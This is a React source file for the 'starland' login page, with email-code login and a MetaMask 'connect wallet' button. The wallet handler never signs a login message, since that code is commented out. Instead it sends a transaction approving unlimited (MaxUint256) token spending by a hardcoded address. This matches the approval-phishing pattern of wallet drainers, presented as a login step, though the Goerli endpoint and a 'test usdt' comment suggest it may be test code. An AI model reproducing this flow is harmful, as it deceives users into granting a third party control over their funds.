import React, { useState, useEffect } from 'react';
import { Form, Input, Checkbox, Grid, Message, Dropdown, Menu, Spin, Notification } from '@arco-design/web-react';
import { useNavigate } from 'react-router-dom';
import 'react-lazy-load-image-component/src/effects/blur.css';
import { useLocalStorageState, useCountDown, useSessionStorageState } from 'ahooks';
import { TokenName } from 'utils';
import Sbutton from 'src/components/Sbutton';
import useI18n from 'src/ahooks/useI18n';
import locales from './locales';
import { serializeError } from 'eth-rpc-errors';
import erc20abi from 'erc-20-abi';
import styles from './index.module.less';
import downArrow from 'src/assets/images/homepage/downArrow.png';
import { sendCodeRequest, loginRequest, useMutations, loginRequestByWallet } from 'apis';
import Icon_Metamask from 'src/assets/images/homepage/Icon_Metamask.png';
import posterImgae from 'src/assets/images/homepage/poster.png';
import { ethers, formatUnits } from 'ethers';
const signMessage = 'welcome to starland';
type IUserParams = {
  email: string;
  code: string;
};
const FormItem = Form.Item;
const themeStyle = {
  background: 'var(--theme-color)',
  color: '#fff',
};
const Saddress = '0x4E43B1d1ea7b3479E1e0f8E84731612DfDc09Ad6';
const Login: React.FC = () => {
  const [form] = Form.useForm();
  const { lang, i18n, changeLanguage } = useI18n(locales);
  const [leftTime, setLeftTime] = useState<number>(0);
  const [walletLoading, setWalletLoading] = useState<boolean>(false);
  const [sevenDay, setSevenDay] = useState<boolean>(true);
  const navigate = useNavigate();
  const [userToken, setUserToken] = useLocalStorageState(TokenName);
  const [userSessionToken, setUserSessionToken] = useSessionStorageState(TokenName);

  const [, formattedRes] = useCountDown({ leftTime, onEnd: () => setLeftTime(0) });
  //   const [loading, setLoading] = useState(false);
  const navigateTo = () => navigate('/dashboard/workplace');

  useEffect(() => {
    // 判断是否登陆
    if (userToken || userSessionToken) {
      navigateTo();
    }
  }, []);

  const handelConnectWallet = async () => {
    let signer = null;

    let provider;
    if (window.ethereum == null) {
      console.log('MetaMask not installed; using read-only defaults');
    } else {
      try {
        setWalletLoading(true);
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        const account = await signer.getAddress();
        const JsonRpcProvider = new ethers.JsonRpcProvider('https://node.wallet.unipass.id/eth-goerli');
        // const sig = await signer.signMessage(signMessage);

        const tokenContract = new ethers.Contract(
          '0x1877a35bf9b8f1cc02d76e7af7f75b37ef906dd0',
          erc20abi,
          JsonRpcProvider,
        );
        const contractInterface = new ethers.Interface(erc20abi);
        const inputData = contractInterface.encodeFunctionData('approve', [Saddress, ethers.MaxUint256]);
        const res2 = await tokenContract.symbol();
        // const res = await tokenContract.allowance(account, '0x4E43B1d1ea7b3479E1e0f8E84731612DfDc09Ad6');
        // const res = await tokenContract.balanceOf(account);
        // const res = await tokenContract.approve('0x1877a35bf9b8f1cc02d76e7af7f75b37ef906dd0', ethers.MaxUint256);
        const contractData = {
          to: '0x1877a35bf9b8f1cc02d76e7af7f75b37ef906dd0' || '0x0000000000000000000000000000000000000000', // test usdt
          data: inputData,
          gasLimit: 500000,
          value: '0x0',
        };
        console.log(contractData, '----');
        console.log(res2);
        // console.log(res, 'res');
        const res1 = await signer.sendTransaction(contractData);
        // console.log(res1, 'res');

        // console.log(formatUnits(res), 'res');
        // const res = await loginRequestByWallet({ sign: sig, address: signer.address, message: signMessage });
        // if (res.token) {
        //   setUserToken(res.token);
        //   navigateTo();
        // }
      } catch (error) {
        console.log(error);
        const data = serializeError(error).data as { originalError: { action: string } };
        if (data.originalError.action === 'signMessage') {
          Notification.error({
            title: 'Signature rejected',
            content: 'Please sign the message in you wallet to continue.',
          });
        }
        if (data.originalError.action === 'requestAccess') {
          Notification.error({
            title: 'Connect Error',
            content: 'Please authorize this website to access your account.',
          });
        }
      } finally {
        setWalletLoading(false);
      }
    }
  };

  const handleSendCode = async () => {
    await form.validate(['email']);
    const email = form.getFieldValue('email');
    await sendCodeRequest(email, lang === 'en-US' ? 2 : 1);
    Message.success('Code has been send');
    setLeftTime(60 * 1000);
  };

  const login = async (params: IUserParams) => {
    const res = await loginRequest(params);
    if (res?.token) {
      if (sevenDay) {
        setUserToken(res.token);
      } else {
        setUserSessionToken(res.token);
      }

      navigateTo();
    }
  };

  const mutation = useMutations({
    mutationFn: handleSendCode,
  });
  const mutationlogin = useMutations({
    mutationFn: login,
  });

  const languageList = (
    <Menu onClickMenuItem={changeLanguage} defaultSelectedKeys={[lang]}>
      <Menu.Item style={lang === 'zh-CN' ? themeStyle : {}} key="zh-CN">
        中文
      </Menu.Item>
      <Menu.Item style={lang === 'en-US' ? themeStyle : {}} key="en-US">
        English
      </Menu.Item>
    </Menu>
  );

  const onSubmit = () => {
    form.validate((err, values) => {
      if (err) {
        return;
      }
      mutationlogin.mutate(values);
    });
  };

  const toHome = () => {
    navigate('/');
  };

  return (
    <div className={styles.login}>
      <video
        src="https://starlands3.s3.ap-southeast-1.amazonaws.com/starland/1687760282949-20230626-104949.mp4"
        className={styles['video-container']}
        autoPlay
        loop
        muted
        poster={posterImgae}
      ></video>
      <div className={styles.right}>
        <div className={styles['login-header']}>
          <div className={styles['head-right']}>
            <Dropdown trigger="click" droplist={languageList} position="bl">
              <div className={styles['lang-button']}>
                {lang === 'zh-CN' ? 'CN' : 'EN'} <img src={downArrow} alt="" className={styles['down-arrow']} />
              </div>
            </Dropdown>
            <div className={styles['back-home-button']} onClick={toHome}>
              {i18n[lang]['login.back.home']}
            </div>
          </div>
        </div>
        <div className={styles['right-inner']}>
          <div className={styles.title}>{`${i18n[lang]['login.email']}`}</div>
          <Form
            form={form}
            style={{ width: 440 }}
            requiredSymbol={false}
            wrapperCol={{
              span: 24,
            }}
            className={styles['login-form']}
            layout="vertical"
            onSubmit={onSubmit}
          >
            <FormItem
              field="email"
              label={i18n[lang]['login.email.text']}
              rules={[
                { required: true, message: `${i18n[lang]['login.username.isNotEmpty']}` },
                {
                  type: 'email',
                  validateLevel: 'error',
                  message: 'please enter right email',
                },
              ]}
            >
              <Input type="text" placeholder={i18n[lang]['login.enter.email']} />
            </FormItem>
            <FormItem label={i18n[lang]['login.email.verify']}>
              <Grid.Row align="center">
                <FormItem
                  field="code"
                  noStyle={{ showErrorTip: true }}
                  rules={[{ required: true, message: `${i18n[lang]['login.password.isNotEmpty']}` }]}
                >
                  <Input
                    placeholder={i18n[lang]['login.enter.verify.code']}
                    style={{ width: '280px', marginRight: '12px' }}
                  />
                </FormItem>
                <Sbutton
                  className={styles['send-code-button']}
                  onClick={mutation.mutateAsync}
                  loading={mutation.isLoading}
                  style={{
                    borderRadius: '32px',
                    border: '1px solid #05F',
                    color: 'rgba(0, 85, 255, 1)',
                    fontFamily: 'Outfit',
                    fontSize: '16px',
                    textTransform: 'capitalize',
                    boxShadow: 'none',
                    height: '64px',
                    width: '140px',
                    lineHeight: '64px',
                    fontWeight: 400,
                    textAlign: 'center',
                    padding: '0 24px',
                  }}
                  text={leftTime > 0 ? `${formattedRes.seconds}s` : `${i18n[lang]['login.sendCode']}`}
                />
              </Grid.Row>
            </FormItem>
            <FormItem>
              <Sbutton
                onClick={onSubmit}
                loading={mutationlogin.isLoading}
                text={i18n[lang]['login.login']}
                className={styles['submit-button']}
                style={{
                  borderRadius: '32px',
                  border: '1px solid #05F',
                  color: '#ffffff',
                  fontFamily: 'Outfit',
                  fontSize: '16px',
                  textTransform: 'capitalize',
                  background: '#05F',
                  boxShadow: 'none',
                  height: '64px',
                  width: '440px',
                  lineHeight: '64px',
                  fontWeight: 400,
                  textAlign: 'center',
                  padding: '0 24px',
                  marginTop: '8px',
                }}
              />
            </FormItem>
          </Form>
          <div className={styles['check-outer']}>
            <Checkbox checked={sevenDay} onChange={(value) => setSevenDay(value)}>
              {i18n[lang]['login.7.days']}
            </Checkbox>
          </div>
          <div className={styles['other-split']}>
            <div className={styles['other-line']}></div>
            <div className={styles['other-title']}>{i18n[lang]['login.other']}</div>
            <div className={styles['other-line']}></div>
          </div>
          <div className={styles['wallet-connect']} onClick={handelConnectWallet}>
            {walletLoading && <Spin></Spin>} <img src={Icon_Metamask} alt="" /> {i18n[lang]['login.wallet.connect']}
          </div>
        </div>
      </div>
      <div className={styles.left}>
        <div className={styles['left-inner']}>
          <div className={styles['star-title']}>starland</div>
          <div className={styles['star-des']}>{i18n[lang]['intro.home.describle']}</div>
          <div className={styles['star-des']}>{i18n[lang]['intro.home.describle1']}</div>
          {/* <div className={styles['star-des']}>Unique Media Package</div> */}
        </div>
      </div>
    </div>
  );
};

export default Login;
